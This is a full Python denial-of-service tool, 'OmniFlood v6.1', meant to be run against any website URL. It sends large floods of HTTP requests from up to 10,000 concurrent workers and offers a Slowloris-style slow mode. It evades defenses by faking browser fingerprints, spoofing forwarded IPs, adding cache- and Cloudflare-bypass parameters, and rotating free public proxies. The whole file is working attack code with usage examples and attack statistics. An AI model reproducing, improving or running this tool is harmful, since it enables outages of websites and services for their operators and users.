#!/usr/bin/env python3
"""
OmniFlood v6.1 - Choose Your Weapons (GET, POST, PUT, PATCH, DELETE, HEAD)
Usage: python omni.py <target> <duration> <methods> [proxy]
Example: python omni.py https://target.com 60 GET,POST,PUT proxy
CATShadow - Supreme Coder
"""

import asyncio
import aiohttp
import ssl
import random
import time
import socket
import hashlib
import json
import sys
import os
import signal
import gc
import re
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
import logging

# Disable logging spam
logging.getLogger('aiohttp').setLevel(logging.CRITICAL)
logging.getLogger('asyncio').setLevel(logging.CRITICAL)

# ==================== CONFIGURATION ====================
MAX_WORKERS = 10000
CONNECTION_POOL_SIZE = 300
PROXY_REFRESH_INTERVAL = 300
MAX_ADAPTIVE_DELAY = 8000
CLIENT_CYCLE_THRESHOLD = 50

# ==================== JA3 FINGERPRINTS ====================
JA3_SIGNATURES = [
    {
        "name": "Chrome 120-130",
        "ciphers": [
            "TLS_AES_128_GCM_SHA256", "TLS_AES_256_GCM_SHA384",
            "TLS_CHACHA20_POLY1305_SHA256", "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
            "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256", "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
            "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384"
        ],
        "curves": ["X25519", "secp256r1", "secp384r1"],
        "next_protos": ["h2", "http/1.1"],
        "min_version": ssl.TLSVersion.TLSv1_2,
        "max_version": ssl.TLSVersion.TLSv1_3
    },
    {
        "name": "Firefox 120-130",
        "ciphers": [
            "TLS_AES_128_GCM_SHA256", "TLS_CHACHA20_POLY1305_SHA256",
            "TLS_AES_256_GCM_SHA384", "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
            "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256"
        ],
        "curves": ["X25519", "secp256r1", "secp384r1", "secp521r1"],
        "next_protos": ["h2", "http/1.1"],
        "min_version": ssl.TLSVersion.TLSv1_2,
        "max_version": ssl.TLSVersion.TLSv1_3
    }
]

# ==================== BROWSER PROFILES ====================
BROWSER_PROFILES = {
    "chrome": {
        "user_agents": [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"
        ],
        "sec_ch_ua": '"Google Chrome";v="125", "Chromium";v="125", "Not?A_Brand";v="24"',
        "platform": "Windows"
    },
    "firefox": {
        "user_agents": [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0"
        ],
        "sec_ch_ua": '"Firefox";v="126", "Gecko";v="126"',
        "platform": "Windows"
    },
    "edge": {
        "user_agents": [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.2535.67",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
        ],
        "sec_ch_ua": '"Microsoft Edge";v="125", "Chromium";v="125", "Not?A_Brand";v="24"',
        "platform": "Windows"
    },
    "safari": {
        "user_agents": [
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
        ],
        "sec_ch_ua": '"Safari";v="17.5", "AppleWebKit";v="605.1.15"',
        "platform": "macOS"
    }
}

# ==================== PROXY API ====================
PROXY_API_URLS = [
    "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=2000",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://api.openproxylist.xyz/http.txt"
]

# ==================== STATUS CODES ====================
STATUS_DESCRIPTIONS = {
    200: "OK", 201: "Created", 202: "Accepted", 203: "Non-Authoritative",
    204: "No Content", 205: "Reset Content", 206: "Partial Content",
    300: "Multiple Choices", 301: "Moved Permanently", 302: "Found",
    303: "See Other", 304: "Not Modified", 307: "Temporary Redirect", 308: "Permanent Redirect",
    400: "Bad Request", 401: "Unauthorized", 402: "Payment Required", 403: "Forbidden",
    404: "Not Found", 405: "Method Not Allowed", 406: "Not Acceptable",
    407: "Proxy Authentication Required", 408: "Request Timeout", 409: "Conflict",
    410: "Gone", 411: "Length Required", 412: "Precondition Failed", 413: "Payload Too Large",
    414: "URI Too Long", 415: "Unsupported Media Type", 416: "Range Not Satisfiable",
    417: "Expectation Failed", 418: "I'm a teapot", 419: "Page Expired", 420: "Enhance Your Calm",
    421: "Misdirected Request", 422: "Unprocessable Content", 423: "Locked",
    424: "Failed Dependency", 425: "Too Early", 426: "Upgrade Required",
    428: "Precondition Required", 429: "Too Many Requests", 430: "Header Fields Too Large",
    431: "Header Fields Too Large", 440: "Login Time-out", 444: "No Response",
    449: "Retry With", 450: "Blocked by Parental Controls", 451: "Unavailable For Legal Reasons",
    460: "Client Closed Connection", 463: "X-Forwarded-For Too Large",
    494: "Request Header Too Large", 495: "SSL Certificate Error", 496: "SSL Certificate Required",
    497: "HTTP to HTTPS", 498: "Invalid Token", 499: "Client Closed Request",
    500: "Internal Server Error", 501: "Not Implemented", 502: "Bad Gateway",
    503: "Service Unavailable", 504: "Gateway Timeout", 505: "HTTP Version Not Supported",
    506: "Variant Also Negotiates", 507: "Insufficient Storage", 508: "Loop Detected",
    509: "Bandwidth Limit Exceeded", 510: "Not Extended", 511: "Network Authentication Required",
    520: "Unknown Error (Cloudflare)", 521: "Web Server Is Down (Cloudflare)",
    522: "Connection Timed Out (Cloudflare)", 523: "Origin Is Unreachable (Cloudflare)",
    524: "A Timeout Occurred (Cloudflare)", 525: "SSL Handshake Failed (Cloudflare)",
    526: "Invalid SSL Certificate (Cloudflare)", 527: "Railgun Error (Cloudflare)",
    529: "Site is overloaded", 530: "Site is frozen", 561: "Unauthorized (AWS ELB)",
    598: "Network Read Timeout Error", 599: "Network Connect Timeout Error"
}

# ==================== UTILITY FUNCTIONS ====================
def rand_str(length):
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    return ''.join(random.choice(chars) for _ in range(length))

def rand_int(min_val, max_val):
    return random.randint(min_val, max_val)

def rand_bool():
    return random.choice([True, False])

def random_ip():
    return f"{rand_int(1,255)}.{rand_int(0,255)}.{rand_int(0,255)}.{rand_int(0,255)}"

def random_element(arr):
    return random.choice(arr) if arr else None

def random_header_name(name):
    return ''.join(c.upper() if rand_bool() else c.lower() for c in name)

def generate_cookies():
    cookie_names = ["sessionid", "userid", "token", "visit", "pref", "cf_clearance", "__cf_bm"]
    cookies = []
    for _ in range(rand_int(1, 3)):
        cookies.append(f"{random_element(cookie_names)}={rand_str(16)}")
    return "; ".join(cookies)

def generate_payload():
    formats = ["json", "form", "plain"]
    fmt = random_element(formats)
    if fmt == "json":
        data = json.dumps({
            "id": rand_int(1, 1000),
            "name": f"user{rand_int(1, 1000)}",
            "random": rand_str(16),
            "timestamp": int(time.time())
        })
        return data, "application/json"
    elif fmt == "form":
        data = f"id={rand_int(1, 1000)}&name=user{rand_int(1, 1000)}&token={rand_str(16)}"
        return data, "application/x-www-form-urlencoded"
    else:
        data = rand_str(rand_int(1024, 10240))
        return data, "text/plain"

def random_path(base_url):
    parsed = urlparse(base_url)
    if not parsed.hostname:
        return base_url
    
    query = parse_qs(parsed.query, keep_blank_values=True)
    
    bypass_params = ["nocache", "bypass", "refresh", "cb", "cache_bust", "t", "_", "v2", "anti_cache"]
    query[random_element(bypass_params)] = [str(rand_int(1, 999999999))]
    
    if rand_bool():
        query["nginx_bypass"] = [rand_str(16)]
    
    if rand_int(1,3) == 0:
        query["wp_"] = [str(rand_int(1, 999999))]
        query["doing_wp_cron"] = [str(int(time.time()))]
    
    if rand_int(1,3) == 0:
        query["cf_bypass"] = [rand_str(16)]
        query["__cf_chl_tk"] = [rand_str(32)]
    
    new_query = urlencode(query, doseq=True)
    return urlunparse((
        parsed.scheme, parsed.netloc, parsed.path or '/',
        parsed.params, new_query, parsed.fragment
    ))

def create_ssl_context():
    ja3 = random_element(JA3_SIGNATURES)
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    
    try:
        ssl_ctx.set_ciphers(':'.join(ja3['ciphers']))
    except:
        pass
    
    ssl_ctx.minimum_version = ja3['min_version']
    ssl_ctx.maximum_version = ja3['max_version']
    ssl_ctx.set_alpn_protocols(ja3['next_protos'])
    
    return ssl_ctx

def generate_headers():
    profile_name = random_element(list(BROWSER_PROFILES.keys()))
    profile = BROWSER_PROFILES[profile_name]
    
    headers = {
        random_header_name('User-Agent'): random_element(profile['user_agents']),
        random_header_name('Accept'): random_element([
            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'application/json, text/plain, */*'
        ]),
        random_header_name('Accept-Encoding'): random_element(['gzip, deflate, br', 'gzip, deflate']),
        random_header_name('Accept-Language'): random_element([
            'en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.9', 'de-DE,de;q=0.9'
        ]),
        random_header_name('Sec-Ch-Ua'): profile['sec_ch_ua'],
        random_header_name('Sec-Ch-Ua-Mobile'): '?0' if rand_bool() else '?1',
        random_header_name('Sec-Ch-Ua-Platform'): f'"{profile["platform"]}"',
        random_header_name('Sec-Fetch-Dest'): random_element(['document', 'script', 'image']),
        random_header_name('Sec-Fetch-Mode'): random_element(['navigate', 'cors']),
        random_header_name('Sec-Fetch-Site'): random_element(['same-origin', 'cross-site', 'none']),
        random_header_name('Upgrade-Insecure-Requests'): '1',
        random_header_name('Cache-Control'): random_element(['no-cache', 'max-age=0', 'must-revalidate']),
        random_header_name('Pragma'): random_element(['no-cache', '']),
        random_header_name('DNT'): random_element(['1', '0']),
        random_header_name('X-Forwarded-For'): random_ip(),
        random_header_name('X-Real-IP'): random_ip(),
        random_header_name('Connection'): 'keep-alive',
        random_header_name('Cookie'): generate_cookies()
    }
    
    extra_headers = [
        ('X-Requested-With', random_element(['XMLHttpRequest', 'Fetch'])),
        ('X-Client-IP', random_ip()),
        ('X-Originating-IP', random_ip()),
        ('Via', f'1.1 {random_ip()}'),
        ('X-Bypass-Cache', random_element(['true', '1', 'yes'])),
        ('Cache-Tag', rand_str(16))
    ]
    
    for k, v in extra_headers:
        if rand_bool():
            headers[random_header_name(k)] = v
    
    items = list(headers.items())
    random.shuffle(items)
    return dict(items)

# ==================== PROXY MANAGER ====================
class ProxyManager:
    def __init__(self, use_proxy=True):
        self.proxies = []
        self.index = 0
        self.lock = asyncio.Lock()
        self.use_proxy = use_proxy
        self.last_refresh = 0
        self.is_refreshing = False
        
        if use_proxy:
            asyncio.create_task(self.refresh_proxies())
    
    async def refresh_proxies(self):
        if self.is_refreshing:
            return
        self.is_refreshing = True
        try:
            all_proxies = set()
            async with aiohttp.ClientSession() as session:
                tasks = []
                for url in PROXY_API_URLS:
                    tasks.append(self._fetch_proxies(session, url))
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                for result in results:
                    if isinstance(result, list):
                        all_proxies.update(result)
            
            self.proxies = list(all_proxies)
            self.last_refresh = time.time()
            if self.proxies:
                print(f"\r[+] Proxies loaded: {len(self.proxies)}", end='')
        except:
            pass
        finally:
            self.is_refreshing = False
    
    async def _fetch_proxies(self, session, url):
        try:
            async with session.get(url, timeout=15) as resp:
                if resp.status == 200:
                    text = await resp.text()
                    proxies = []
                    for line in text.split('\n'):
                        line = line.strip()
                        if line and not line.startswith('#') and ':' in line:
                            parts = line.split(':')
                            if len(parts) >= 2 and parts[1].isdigit():
                                proxies.append(line)
                    return proxies
        except:
            pass
        return []
    
    async def get_proxy(self):
        if not self.use_proxy:
            return None
        
        async with self.lock:
            if (time.time() - self.last_refresh) > PROXY_REFRESH_INTERVAL:
                asyncio.create_task(self.refresh_proxies())
            
            if not self.proxies:
                await self.refresh_proxies()
                if not self.proxies:
                    return None
            
            proxy = self.proxies[self.index % len(self.proxies)]
            self.index += 1
            return proxy

# ==================== CONNECTION POOL ====================
class ConnectionPool:
    def __init__(self, target, proxy_manager):
        self.target = target
        self.proxy_manager = proxy_manager
        self.sessions = []
        self.session_lock = asyncio.Lock()
        self.used_sessions = set()
        self.closed = False
        self.cycle_counter = 0
        self.pool_size = CONNECTION_POOL_SIZE
    
    def _create_session(self):
        try:
            proxy_url = None
            if self.proxy_manager and self.proxy_manager.use_proxy:
                try:
                    loop = asyncio.get_event_loop()
                    if loop.is_running():
                        future = asyncio.ensure_future(self.proxy_manager.get_proxy())
                        try:
                            proxy_url = future.result(timeout=1)
                        except:
                            pass
                except:
                    pass
            
            ssl_ctx = create_ssl_context()
            
            if proxy_url:
                if not proxy_url.startswith(('http://', 'https://')):
                    proxy_url = 'http://' + proxy_url
                connector = aiohttp.TCPConnector(
                    ssl=ssl_ctx,
                    force_close=True,
                    limit=100,
                    limit_per_host=100,
                    ttl_dns_cache=300,
                    keepalive_timeout=30,
                    enable_cleanup_closed=True
                )
            else:
                connector = aiohttp.TCPConnector(
                    ssl=ssl_ctx,
                    force_close=True,
                    limit=100,
                    limit_per_host=100,
                    ttl_dns_cache=300,
                    keepalive_timeout=30,
                    enable_cleanup_closed=True
                )
            
            headers = generate_headers()
            timeout = aiohttp.ClientTimeout(total=30, connect=10, sock_read=30)
            session = aiohttp.ClientSession(
                connector=connector,
                timeout=timeout,
                headers=headers
            )
            return session
        except:
            return None
    
    async def get_session(self):
        if self.closed:
            return None
        
        async with self.session_lock:
            self.sessions = [s for s in self.sessions if not s.closed]
            self.used_sessions = {s for s in self.used_sessions if not s.closed}
            
            self.cycle_counter += 1
            if self.cycle_counter > CLIENT_CYCLE_THRESHOLD:
                for session in self.sessions[:5]:
                    try:
                        if not session.closed:
                            await session.close()
                    except:
                        pass
                self.cycle_counter = 0
            
            while len(self.sessions) < self.pool_size:
                session = self._create_session()
                if session:
                    self.sessions.append(session)
                else:
                    break
            
            available = [s for s in self.sessions if s not in self.used_sessions and not s.closed]
            if available:
                session = random_element(available)
                self.used_sessions.add(session)
                return session
            
            if self.sessions:
                session = random_element(self.sessions)
                if not session.closed:
                    return session
            
            return None
    
    def release_session(self, session):
        if session and not self.closed:
            asyncio.create_task(self._release_session_async(session))
    
    async def _release_session_async(self, session):
        async with self.session_lock:
            if session in self.used_sessions:
                self.used_sessions.remove(session)
    
    async def close(self):
        if self.closed:
            return
        self.closed = True
        async with self.session_lock:
            for session in self.sessions:
                try:
                    if not session.closed:
                        await session.close()
                except:
                    pass
            self.sessions.clear()
            self.used_sessions.clear()
            gc.collect()

# ==================== SLOW ATTACK ====================
class SlowAttack:
    def __init__(self, target, duration):
        self.target = target
        self.duration = duration
        self.connections = 0
        self.running = True
    
    async def slow_worker(self):
        parsed = urlparse(self.target)
        host = parsed.hostname
        port = 443 if parsed.scheme == 'https' else 80
        is_https = parsed.scheme == 'https'
        
        while self.running:
            try:
                reader, writer = await asyncio.open_connection(
                    host, port, ssl=is_https if is_https else None
                )
                
                request = (
                    f"GET {parsed.path or '/'} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: {random_element(BROWSER_PROFILES['chrome']['user_agents'])}\r\n"
                    f"Accept: */*\r\n"
                    f"Connection: keep-alive\r\n"
                    f"X-Forwarded-For: {random_ip()}\r\n"
                )
                
                lines = request.split('\r\n')
                for line in lines:
                    if not self.running:
                        break
                    writer.write((line + '\r\n').encode())
                    await writer.drain()
                    await asyncio.sleep(0.5)
                
                if not self.running:
                    writer.close()
                    await writer.wait_closed()
                    break
                
                self.connections += 1
                await asyncio.sleep(30)
                writer.close()
                await writer.wait_closed()
                
            except:
                pass
            
            await asyncio.sleep(0.1)
    
    async def run(self):
        workers = [asyncio.create_task(self.slow_worker()) for _ in range(1000)]
        await asyncio.sleep(self.duration)
        self.running = False
        if workers:
            await asyncio.wait(workers, timeout=10)
        return {'total': self.connections, 'connections': self.connections}

# ==================== ATTACK ENGINE ====================
class AttackEngine:
    def __init__(self, target, methods, duration, use_proxy=True):
        self.target = target
        self.methods = methods
        self.duration = duration
        self.use_proxy = use_proxy
        self.proxy_manager = ProxyManager(use_proxy)
        self.pool = ConnectionPool(target, self.proxy_manager)
        self.stats = {
            'total': 0, 'success': 0, 'failed': 0,
            'status_counts': {},
            'error_types': {},
            'method_counts': {m: 0 for m in methods}
        }
        self.running = True
        self.start_time = time.time()
        self.current_delay = 0
        self.lock = asyncio.Lock()
        self.logs = []
        
        if use_proxy:
            print("[*] Fetching proxies from API...")
    
    async def worker(self):
        while self.running:
            try:
                session = await self.pool.get_session()
                if not session:
                    await asyncio.sleep(0.1)
                    continue
                
                # Choose method randomly from the specified ones
                method = random_element(self.methods)
                
                path = random_path(self.target)
                
                data = None
                content_type = None
                if method in ['POST', 'PUT', 'PATCH']:
                    data, content_type = generate_payload()
                
                headers = generate_headers()
                if content_type:
                    headers[random_header_name('Content-Type')] = content_type
                
                start = time.time()
                try:
                    async with session.request(
                        method=method,
                        url=path,
                        data=data,
                        headers=headers,
                        timeout=aiohttp.ClientTimeout(total=15)
                    ) as resp:
                        await resp.read()
                        latency = (time.time() - start) * 1000
                        
                        self.stats['success'] += 1
                        self.stats['method_counts'][method] += 1
                        
                        code = resp.status
                        status_key = "HTTP"
                        if status_key not in self.stats['status_counts']:
                            self.stats['status_counts'][status_key] = {}
                        if code not in self.stats['status_counts'][status_key]:
                            self.stats['status_counts'][status_key][code] = 0
                        self.stats['status_counts'][status_key][code] += 1
                        
                        # Adaptive delay
                        if code in [401, 403, 429, 430, 431, 451, 460, 463, 494, 499]:
                            self.current_delay += 150
                        elif code in [400, 406, 410, 412, 417, 421, 422, 423]:
                            self.current_delay += 75
                        elif code in [413, 444]:
                            self.current_delay += 50
                        self.current_delay = min(self.current_delay, MAX_ADAPTIVE_DELAY)
                        
                except Exception as e:
                    self.stats['failed'] += 1
                    error_type = type(e).__name__
                    if error_type not in self.stats['error_types']:
                        self.stats['error_types'][error_type] = 0
                    self.stats['error_types'][error_type] += 1
                
                self.stats['total'] += 1
                self.pool.release_session(session)
                
                # Rate limiting
                elapsed = (time.time() - start) * 1000
                if elapsed < 50:
                    await asyncio.sleep((50 - elapsed) / 1000 + random.uniform(0, 0.01))
                
                # Adaptive delay
                if self.current_delay > 0:
                    await asyncio.sleep(self.current_delay / 1000)
                    self.current_delay = max(0, self.current_delay - 10)
                
            except:
                await asyncio.sleep(0.1)
    
    async def run(self):
        cleanup_task = asyncio.create_task(self._cleanup_loop())
        
        workers = [asyncio.create_task(self.worker()) for _ in range(MAX_WORKERS)]
        
        monitor_task = asyncio.create_task(self._monitor())
        
        await asyncio.sleep(self.duration)
        self.running = False
        
        if workers:
            await asyncio.wait(workers, timeout=10)
        
        monitor_task.cancel()
        try:
            await monitor_task
        except:
            pass
        
        cleanup_task.cancel()
        try:
            await cleanup_task
        except:
            pass
        
        await self.pool.close()
        return self.stats
    
    async def _cleanup_loop(self):
        while self.running:
            await asyncio.sleep(60)
            if self.pool:
                async with self.pool.session_lock:
                    self.pool.sessions = [s for s in self.pool.sessions if not s.closed]
                    self.pool.used_sessions = {s for s in self.pool.used_sessions if not s.closed}
    
    async def _monitor(self):
        while self.running:
            await asyncio.sleep(0.5)
            elapsed = time.time() - self.start_time
            total = self.stats['total']
            rps = total / elapsed if elapsed > 0 else 0
            
            # Status string
            status_parts = []
            for version, codes in self.stats['status_counts'].items():
                for code, count in codes.items():
                    status_parts.append(f"{code}={count}")
            status_str = ", ".join(status_parts[:5]) or "No responses"
            
            # Method breakdown
            method_str = ", ".join([f"{m}:{self.stats['method_counts'].get(m, 0)}" for m in self.methods])
            
            sys.stdout.write('\033[H\033[J')
            print(f"{'='*70}")
            print(f"🐱 CATShadow OmniFlood v6.1 - Multi-Method Attack")
            print(f"{'='*70}")
            print(f"Target: {self.target}")
            print(f"Methods: {', '.join(self.methods)}")
            print(f"Method Distribution: {method_str}")
            print(f"Elapsed: {elapsed:.1f}s / {self.duration}s")
            print(f"Requests: {total} | RPS: {rps:.1f}")
            print(f"Success: {self.stats['success']} | Failed: {self.stats['failed']}")
            print(f"Adaptive Delay: {self.current_delay}ms")
            print(f"Proxies: {'Enabled' if self.use_proxy else 'Disabled'}")
            if self.proxy_manager.proxies:
                print(f"Proxy Count: {len(self.proxy_manager.proxies)}")
            print(f"Status: {status_str}")
            print(f"{'='*70}")
            sys.stdout.flush()

# ==================== MAIN ====================
def main():
    # Parse args: python omni.py <target> <duration> <methods> [proxy]
    if len(sys.argv) < 4:
        print("""
🐱 CATShadow OmniFlood v6.1 - Choose Your Weapons
Usage: python omni.py <target> <duration> <methods> [proxy]

Available Methods:
  GET     - Standard GET requests
  POST    - POST with random payload (json/form/plain)
  PUT     - PUT with random payload
  PATCH   - PATCH with random payload  
  DELETE  - DELETE requests
  HEAD    - HEAD requests (no body)
  SLOW    - Slowloris-style keep-alive connections
  ALL     - Use all methods: GET,POST,PUT,PATCH,DELETE,HEAD

Examples:
  python omni.py https://target.com 60 GET,POST
  python omni.py https://target.com 120 GET,POST,PUT,PATCH
  python omni.py https://target.com 30 GET,POST,PUT,PATCH,DELETE,HEAD proxy
  python omni.py https://target.com 60 ALL proxy
  python omni.py https://target.com 60 SLOW
  python omni.py https://target.com 60 SLOW proxy
        """)
        sys.exit(1)
    
    target = sys.argv[1]
    duration = int(sys.argv[2])
    methods_str = sys.argv[3].upper()
    
    # Check for proxy flag
    use_proxy = False
    if len(sys.argv) > 4 and sys.argv[4].lower() == 'proxy':
        use_proxy = True
    
    # Parse methods
    all_methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD']
    
    if methods_str == 'ALL':
        methods = all_methods
    else:
        methods = [m.strip() for m in methods_str.split(',') if m.strip() in all_methods]
    
    if not methods:
        print("[!] No valid methods specified. Use: GET,POST,PUT,PATCH,DELETE,HEAD,SLOW,ALL")
        sys.exit(1)
    
    # Check for SLOW mode
    if 'SLOW' in methods:
        print(f"\n🐱 CATShadow OmniFlood v6.1 - SLOW ATTACK")
        print(f"{'='*50}")
        print(f"Target: {target}")
        print(f"Duration: {duration}s")
        print(f"Mode: SLOW")
        print(f"Proxies: {'Enabled' if use_proxy else 'Disabled'}")
        print(f"{'='*50}\n")
        
        if use_proxy:
            print("[!] SLOW mode does not use proxies")
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            engine = SlowAttack(target, duration)
            stats = loop.run_until_complete(engine.run())
            print(f"\nSLOW Attack Complete:")
            print(f"  Connections kept open: {stats['connections']}")
            print(f"  Total requests: {stats['total']}")
        except KeyboardInterrupt:
            print("\n[!] Attack interrupted")
        finally:
            loop.close()
        return
    
    # Normal attack
    print(f"\n🐱 CATShadow OmniFlood v6.1 - Multi-Method Attack")
    print(f"{'='*50}")
    print(f"Target: {target}")
    print(f"Duration: {duration}s")
    print(f"Methods: {', '.join(methods)}")
    print(f"Proxies: {'Enabled (auto-fetch from API)' if use_proxy else 'Disabled'}")
    print(f"{'='*50}\n")
    
    # Run attack
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    try:
        engine = AttackEngine(target, methods, duration, use_proxy)
        stats = loop.run_until_complete(engine.run())
        
        elapsed = time.time() - engine.start_time
        
        print(f"\n{'='*50}")
        print("ATTACK COMPLETE")
        print(f"{'='*50}")
        print(f"Duration: {elapsed:.1f}s")
        print(f"Total Requests: {stats['total']}")
        print(f"Successful: {stats['success']}")
        print(f"Failed: {stats['failed']}")
        if stats['total'] > 0:
            print(f"Success Rate: {(stats['success']/stats['total']*100):.1f}%")
            print(f"Average RPS: {stats['total']/elapsed:.1f}")
        
        print(f"\nMethod Distribution:")
        for method, count in stats['method_counts'].items():
            if stats['total'] > 0:
                pct = (count / stats['total']) * 100
                print(f"  {method}: {count} ({pct:.1f}%)")
            else:
                print(f"  {method}: {count}")
        
        print(f"\nStatus Codes:")
        for version, codes in stats['status_counts'].items():
            for code, count in sorted(codes.items()):
                status_text = STATUS_DESCRIPTIONS.get(code, 'Unknown')
                print(f"  {code} ({status_text}): {count}")
        
        if stats['error_types']:
            print(f"\nError Types:")
            for error_type, count in sorted(stats['error_types'].items(), key=lambda x: -x[1]):
                print(f"  {error_type}: {count}")
        
        print(f"{'='*50}")
        
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted")
    finally:
        loop.close()

if __name__ == "__main__":
    try:
        signal.signal(signal.SIGINT, lambda s, f: None)
        main()
    except KeyboardInterrupt:
        print("\n[!] Shutting down...")
    except Exception as e:
        print(f"\n[!] Error: {e}")
    finally:
        gc.collect()
